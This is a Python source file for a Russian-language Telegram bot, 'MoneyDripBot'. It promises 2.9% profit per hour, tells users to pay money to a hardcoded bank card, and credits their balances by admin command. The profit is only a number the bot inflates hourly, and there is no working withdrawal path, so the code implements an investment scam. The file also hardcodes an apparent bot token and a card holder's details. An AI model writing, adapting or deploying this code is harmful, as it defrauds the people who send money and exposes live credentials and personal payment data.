import asyncio
import logging
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
import aiosqlite
import re

# ========== НАСТРОЙКИ ==========
TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
ADMIN_ID = 7603296347
SUPPORT_USERNAME = "WWWMMMZZZwq"
CARD_NUMBER = "2200 7012 3329 6489"  # ✅ ТВОЯ КАРТА
CARD_HOLDER = "Дмитрий А."  # Имя на карте
# ================================

bot = Bot(token=TOKEN)
dp = Dispatcher()

# === ПАРСИНГ ЧИСЕЛ (100k = 100000) ===
def parse_amount(text: str) -> float:
    text = text.lower().replace(" ", "").replace(",", ".")
    if "k" in text:
        return float(text.replace("k", "")) * 1000
    elif "m" in text:
        return float(text.replace("m", "")) * 1000000
    else:
        return float(text)

# === БАЗА ДАННЫХ ===
async def init_db():
    async with aiosqlite.connect("users.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                balance REAL DEFAULT 0,
                invest_sum REAL DEFAULT 0,
                last_percent TEXT,
                deposit_request REAL DEFAULT 0,
                withdraw_request REAL DEFAULT 0
            )
        """)
        await db.commit()

# === СТАРТ ===
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    async with aiosqlite.connect("users.db") as db:
        await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        await db.commit()
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Умножить деньги", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="percent_info")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    await message.answer(
        "🚀 *Добро пожаловать в MoneyDripBot!*\n\n"
        "💰 Легко приумножай деньги:\n"
        "• Каждый час +2,9% к сумме\n"
        "• Вывод сразу после запроса\n"
        "• Можно вводить 100k = 100 000₽\n"
        "• Работаем честно, без лохотрона ✅\n\n"
        "👇 *Выбери действие:*",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === БАЛАНС ===
@dp.callback_query(lambda c: c.data == "balance")
async def show_balance(call: CallbackQuery):
    user_id = call.from_user.id
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT balance, invest_sum FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            balance = row[0] if row else 0
            invest = row[1] if row else 0
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"💳 *ТВОЙ БАЛАНС*\n\n"
        f"💰 Доступно: `{balance:,.0f}₽`\n"
        f"📈 В работе: `{invest:,.0f}₽`\n\n"
        f"⏳ Каждый час +2,9% к сумме в работе 🔥",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ПОПОЛНЕНИЕ С КАРТОЙ ===
@dp.callback_query(lambda c: c.data == "deposit")
async def deposit_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="i_paid")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📥 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
        f"💳 *Карта для перевода:*\n"
        f"`{CARD_NUMBER}`\n"
        f"👤 *Получатель:* {CARD_HOLDER}\n\n"
        "💰 *Минимальная сумма:* 100₽\n"
        "🚀 *Максимум:* безлимит\n\n"
        "📌 *Как пополнить:*\n"
        "1️⃣ Переведи любую сумму на карту\n"
        "2️⃣ Нажми кнопку *«✅ Я оплатил»*\n"
        "3️⃣ Введи сумму перевода\n\n"
        "✅ Примеры: `500`, `1.5k`, `2K`\n"
        "👉 `1k = 1000₽`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === Я ОПЛАТИЛ ===
@dp.callback_query(lambda c: c.data == "i_paid")
async def i_paid(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📝 *Введите сумму перевода:*\n\n"
        "➡️ Например: `500`, `1.5k`, `2K`\n\n"
        "⚠️ Сумма должна совпадать с переводом!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА ЧИСЕЛ (ТОЛЬКО ПОПОЛНЕНИЕ) ===
@dp.message(lambda m: m.text and re.match(r'^[\d\.]+[km]?$', m.text.lower().replace(" ", "")))
async def process_deposit(message: Message):
    user_id = message.from_user.id
    try:
        amount = parse_amount(message.text)
    except:
        await message.answer("❌ Неверный формат. Примеры: 500, 1.5k, 2K")
        return
    
    if amount < 100:
        await message.answer("❌ Минимальная сумма пополнения — 100 ₽")
        return
    
    # Сохраняем заявку
    async with aiosqlite.connect("users.db") as db:
        await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
    
    # Отправляем админу
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{CARD_NUMBER}`\n\n"
        f"✅ *Подтвердить:* `/confirm {user_id}`",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка отправлена!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"⏳ Ожидай подтверждения (1-3 минуты)\n\n"
        f"❓ Вопросы: @{SUPPORT_USERNAME}",
        parse_mode="Markdown"
    )

# === УМНОЖИТЬ ДЕНЬГИ ===
@dp.callback_query(lambda c: c.data == "multiply")
async def multiply_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "💰 *УМНОЖЕНИЕ ДЕНЕГ*\n\n"
        "💸 Введи сумму для запуска в работу:\n"
        "• Минимум: 100₽\n"
        "• Каждый час +2,9%\n\n"
        "✅ Примеры: `500`, `1.5k`, `2K`\n\n"
        "⚠️ *Деньги спишутся с баланса мгновенно!*",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА УМНОЖЕНИЯ ===
@dp.message(lambda m: m.text and m.text.lower().startswith('*'))
async def process_multiply(message: Message):
    user_id = message.from_user.id
    text = message.text.replace('*', '').strip()
    
    try:
        amount = parse_amount(text)
    except:
        await message.answer("❌ Неверный формат. Используй: *500, *1.5k, *2K")
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            balance = row[0] if row else 0
        
        if amount > balance:
            await message.answer(f"❌ Недостаточно средств. Баланс: `{balance:,.0f}₽`")
            return
        
        if amount < 100:
            await message.answer("❌ Минимальная сумма — 100 ₽")
            return
        
        await db.execute(
            "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_percent = ? WHERE user_id = ?",
            (amount, amount, datetime.now().isoformat(), user_id)
        )
        await db.commit()
    
    await message.answer(
        f"✅ *ГОТОВО!*\n\n"
        f"💸 `{amount:,.0f}₽` запущены в работу\n"
        f"📈 Каждый час +2,9%\n"
        f"💰 Баланс: `{balance - amount:,.0f}₽`\n"
        f"📊 В работе: `{amount:,.0f}₽`\n\n"
        f"⏳ Первые проценты через 60 минут",
        parse_mode="Markdown"
    )

# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ ===
@dp.message(Command("confirm"))
async def confirm_deposit(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /confirm 123456789")
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT deposit_request FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            if not row or row[0] == 0:
                await message.answer("❌ Нет активных заявок")
                return
            
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?", (amount, user_id))
            await db.commit()
    
    await message.answer(f"✅ Баланс пользователя {user_id} пополнен на {amount:,.0f}₽")
    await bot.send_message(user_id, f"✅ *Баланс пополнен!*\n\n💰 Сумма: `{amount:,.0f}₽`\n\n🚀 Можешь запускать умножение!", parse_mode="Markdown")

# === ДОБАВИТЬ БАЛАНС АДМИНОМ ===
@dp.message(Command("add"))
async def add_balance(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = float(parts[2])
    except:
        await message.answer("Используй: /add 123456789 1000")
        return
    
    async with aiosqlite.connect("users.db") as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
    
    await message.answer(f"✅ Баланс пользователя {user_id} увеличен на {amount:,.0f}₽")
    await bot.send_message(user_id, f"💰 *Вам начислено {amount:,.0f}₽!*", parse_mode="Markdown")

# === ПРОЦЕНТЫ (КАЖДЫЙ ЧАС) ===
async def percent_worker():
    while True:
        await asyncio.sleep(3600)
        async with aiosqlite.connect("users.db") as db:
            async with db.execute("SELECT user_id, invest_sum FROM users WHERE invest_sum > 0") as cursor:
                users = await cursor.fetchall()
                for user_id, invest in users:
                    profit = invest * 0.029
                    await db.execute("UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?", (profit, user_id))
                    try:
                        await bot.send_message(
                            user_id,
                            f"📈 *НАЧИСЛЕНИЕ ПРОЦЕНТОВ*\n\n"
                            f"➕ +`{profit:,.2f}₽`\n"
                            f"💰 В работе: `{invest + profit:,.2f}₽`\n\n"
                            f"⏳ Следующее начисление через 60 минут",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
            await db.commit()

# === ПОДДЕРЖКА ===
@dp.callback_query(lambda c: c.data == "support")
async def support(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "🛡 *ПОДДЕРЖКА*\n\n"
        f"📩 Логин: @{SUPPORT_USERNAME}\n"
        "⏱ Время ответа: 5–15 минут",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ИНФО ===
@dp.callback_query(lambda c: c.data == "info")
async def info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "ℹ️ *ИНФОРМАЦИЯ*\n\n"
        "💰 *Проценты:* 2,9% в час\n"
        "📉 *Мин. старт:* 100₽\n"
        "📤 *Мин. вывод:* 100₽\n"
        "💳 *Карта:* Сбербанк\n"
        "✅ *Честно и прозрачно*\n\n"
        "📌 *Форматы ввода:*\n"
        "• `500` — 500₽\n"
        "• `1.5k` — 1500₽\n"
        "• `2K` — 2000₽\n"
        "• `0.5m` — 500 000₽",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ПРОЦЕНТЫ ИНФО ===
@dp.callback_query(lambda c: c.data == "percent_info")
async def percent_info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📈 *КАК РАБОТАЮТ ПРОЦЕНТЫ*\n\n"
        "1️⃣ Пополни баланс через карту\n"
        "2️⃣ Запусти деньги в работу\n"
        "3️⃣ Каждый час +2,9%\n\n"
        "✨ *Пример:*\n"
        "1000₽ → 1029₽ (1 час)\n"
        "→ ~2000₽ (24 часа)\n"
        "→ ~8000₽ (3 дня)\n\n"
        "🚀 Чем больше сумма, тем быстрее рост!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ВЫВОД СРЕДСТВ ===
@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📤 *ВЫВОД СРЕДСТВ*\n\n"
        "💰 Минимальная сумма: 100₽\n"
        "💳 Вывод на карту\n\n"
        "➡️ *Напиши сумму для вывода:*\n"
        "✅ Примеры: 500, 1.5k, 2K",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === НАЗАД В МЕНЮ ===
@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Умножить деньги", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="percent_info")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    await call.message.edit_text(
        "🚀 *Главное меню*\n\n"
        "👇 Выбери действие:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === СТАТИСТИКА ===
@dp.message(Command("stats"))
async def stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT COUNT(*) FROM users") as cursor:
            total_users = await cursor.fetchone()
            total_users = total_users[0]
        
        async with db.execute("SELECT SUM(balance) FROM users") as cursor:
            total_balance = await cursor.fetchone()
            total_balance = total_balance[0] or 0
        
        async with db.execute("SELECT SUM(invest_sum) FROM users") as cursor:
            total_invest = await cursor.fetchone()
            total_invest = total_invest[0] or 0
    
    await message.answer(
        f"📊 *СТАТИСТИКА*\n\n"
        f"👥 Пользователей: `{total_users}`\n"
        f"💰 Всего баланс: `{total_balance:,.0f}₽`\n"
        f"📈 В работе: `{total_invest:,.0f}₽`",
        parse_mode="Markdown"
    )

# === УЗНАТЬ СВОЙ ID ===
@dp.message(Command("id"))
async def get_id(message: Message):
    await message.answer(f"🆔 *Твой Telegram ID:* `{message.from_user.id}`", parse_mode="Markdown")

# === ЗАПУСК ===
async def main():
    logging.basicConfig(level=logging.INFO)
    await init_db()
    asyncio.create_task(percent_worker())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())